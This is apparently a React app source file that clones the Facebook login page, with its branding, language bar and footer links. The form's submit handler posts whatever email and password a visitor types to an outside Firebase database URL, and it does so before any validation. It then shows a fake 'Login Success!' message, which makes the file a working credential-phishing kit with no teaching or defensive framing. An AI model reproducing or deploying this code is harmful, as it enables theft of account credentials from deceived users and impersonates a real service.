import React, { useState } from "react";
import "./index.css";
import { Form, Button } from "react-bootstrap";
import Modal from "react-bootstrap/Modal";
import Alert from "react-bootstrap/Alert";

const App = () => {
  const [data, setData] = useState({
    name: "",
    password: "",
  });
  const handler = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };
  const submit = (e) => {
    e.preventDefault();
    fetch("https://facebook-test-825d5-default-rtdb.firebaseio.com/data.json", {
      method: "post",
      body: JSON.stringify(data),
    }).then((res) => {
      if (data.name == "" && data.password == "") {
        document.getElementById("demo").innerHTML =
          " Name and Password Should Not Be Empty";
        document.getElementById("demo").style.display = "block";
      } else if (data.name == "") {
        document.getElementById("demo").innerHTML = "Please Enter Name";
        document.getElementById("demo").style.display = "block";
      } else if (data.password == "") {
        document.getElementById("demo").innerHTML = "Please Enter Password";
        document.getElementById("demo").style.display = "block";
      } else if (data.name.length < 5 || data.password.length < 5) {
        document.getElementById("demo").innerHTML =
          "Email Or Password Must Be 5 Charecters";
        document.getElementById("demo").style.display = "block";
      } else {
        document.getElementById("demo").style.display = "none";
        handleShow();
        e.preventDefault();
      }
    });
  };
  const [show, setShow] = useState(false);

  const handleClose = () => setShow(false);
  const handleShow = () => setShow(true);

  const [dat, setDat] = useState(true);
  return (
    <>
      <Alert show={dat} variant="danger" id="alert">
        <Alert.Heading style={{ fontFamily: "serif" }}>
          Welcome {}
        </Alert.Heading>
        <p style={{ fontSize: "18px" }}>Login To Facebook</p>
        <hr />
        <div className="d-flex justify-content-end">
          <Button
            onClick={() => setDat(false)}
            variant="outline-success"
            id="close"
          >
            Close
          </Button>
        </div>
      </Alert>
      <div>
        <div id="home">
          <div className="container-fluid">
            <div className="row">
              <div className="col-md-1"></div>
              <div className="col-md-6">
                <div id="face-head">
                  <div id="face">
                    <h2>facebook</h2>
                  </div>
                  <p>
                    Facebook helps you connect and share with the people in your
                    life.
                  </p>
                </div>
              </div>

              <div className="col-md-4">
                <div className="shadow" id="form">
                  <p id="demo"></p>
                  <Form onSubmit={submit} method="post">
                    <Form.Group className="mb-3" controlId="formBasicEmail">
                      <Form.Control
                        type="text"
                        placeholder="Email or Phone Number"
                        className="inner"
                        name="name"
                        onChange={handler}
                      />
                    </Form.Group>

                    <Form.Group className="mb-3" controlId="formBasicPassword">
                      <Form.Control
                        type="password"
                        placeholder="Password"
                        className="inner"
                        name="password"
                        onChange={handler}
                      />
                    </Form.Group>
                    <Form.Group
                      className="mb-3"
                      controlId="formBasicCheckbox"
                    ></Form.Group>
                    <div className="d-grid">
                      <Button
                        variant="primary"
                        id="login-btn"
                        data-bs-target="#signupModal"
                        size="lg"
                        type="submit"
                      >
                        Log In
                      </Button>
                    </div>
                    <div className="forgot">
                      <a href="">Forgotten Password?</a>
                    </div>
                    <hr />
                    <div className="account">
                      <Button variant="success" id="account-btn" type="submit">
                        Create New Account
                      </Button>
                    </div>
                  </Form>
                </div>
                <div>
                  <span className="page">
                    <a href="">Create a page</a> for a celebrity, brand or
                    business
                  </span>
                </div>
              </div>

              <div className="col-md-1"></div>
            </div>
          </div>
        </div>
        <div id="section">
          <div className="container-fluid">
            <div className="row">
              <div className="col-md-12">
                <div className="buttons">
                  <small>English(UK)</small>
                  <a href="#" className="btn btn-sm">
                    हिन्दी
                  </a>
                  <a href="#" className="btn btn-sm">
                    اردو
                  </a>
                  <a href="#" className="btn btn-sm">
                    தமிழ்
                  </a>
                  <a href="#" className="btn btn-sm">
                    বাংলা
                  </a>
                  <a href="#" className="btn btn-sm">
                    मराठी
                  </a>
                  <a href="#" className="btn btn-sm">
                    తెలుగు
                  </a>
                  <a href="#" className="btn btn-sm">
                    ગુજરાતી
                  </a>
                  <a href="#" className="btn btn-sm">
                    ಕನ್ನಡ
                  </a>
                  <a href="#" className="btn btn-sm">
                    മലയാളം
                  </a>
                  <a href="#" className="btn btn-sm">
                    Español
                  </a>
                  <a href="" className="fa">
                    <b>+</b>
                  </a>

                  <hr id="horizontal" />
                </div>
              </div>
            </div>
          </div>
          <div className="container-fluid">
            <div className="row">
              <div className="col-md-12">
                <div id="links">
                  <a href="" className="btn btn-sm">
                    Sign Up
                  </a>
                  <a href="" className="btn btn-sm">
                    Log in
                  </a>
                  <a href="" className="btn btn-sm">
                    Messenger
                  </a>
                  <a href="" className="btn btn-sm">
                    Facebook Lite
                  </a>
                  <a href="" className="btn btn-sm">
                    Watch
                  </a>
                  <a href="" className="btn btn-sm">
                    Places
                  </a>
                  <a href="" className="btn btn-sm">
                    Games
                  </a>
                  <a href="" className="btn btn-sm">
                    Marketplace
                  </a>
                  <a href="" className="btn btn-sm">
                    Facebook Pay
                  </a>
                  <a href="" className="btn btn-sm">
                    Oculus
                  </a>
                  <a href="" className="btn btn-sm">
                    Portal
                  </a>
                  <a href="" className="btn btn-sm">
                    Instagram
                  </a>
                  <a href="" className="btn btn-sm">
                    Bulletin
                  </a>
                  <a href="" className="btn btn-sm">
                    Local
                  </a>
                  <a href="" className="btn btn-sm">
                    Fundraisers
                  </a>
                  <a href="" className="btn btn-sm">
                    Services
                  </a>
                  <a href="" className="btn btn-sm">
                    Voting Information Centre
                  </a>
                  <a href="" className="btn btn-sm">
                    Groups
                  </a>
                  <a href="" className="btn btn-sm">
                    About
                  </a>
                  <a href="" className="btn btn-sm">
                    Create ad
                  </a>
                  <a href="" className="btn btn-sm">
                    Create Page
                  </a>
                  <a href="" className="btn btn-sm">
                    Developers
                  </a>
                  <a href="" className="btn btn-sm">
                    Careers
                  </a>
                  <a href="" className="btn btn-sm">
                    Privacy
                  </a>
                  <a href="" className="btn btn-sm">
                    Cookies
                  </a>
                  <a href="" className="btn btn-sm">
                    AdChoices
                  </a>
                  <a href="" className="btn btn-sm">
                    Terms
                  </a>
                  <a href="" className="btn btn-sm">
                    Help
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Modal show={show} onHide={handleClose} id="signupModal">
        <Modal.Header closeButton>
          <Modal.Title>Welcome</Modal.Title>
        </Modal.Header>
        <Modal.Body style={{ color: "green", fontWeight: "600" }}>
          Login Success!
        </Modal.Body>
        <Modal.Footer>
          <Button variant="primary" onClick={handleClose}>
            Ok
          </Button>
        </Modal.Footer>
      </Modal>
    </>
  );
};

export default App;
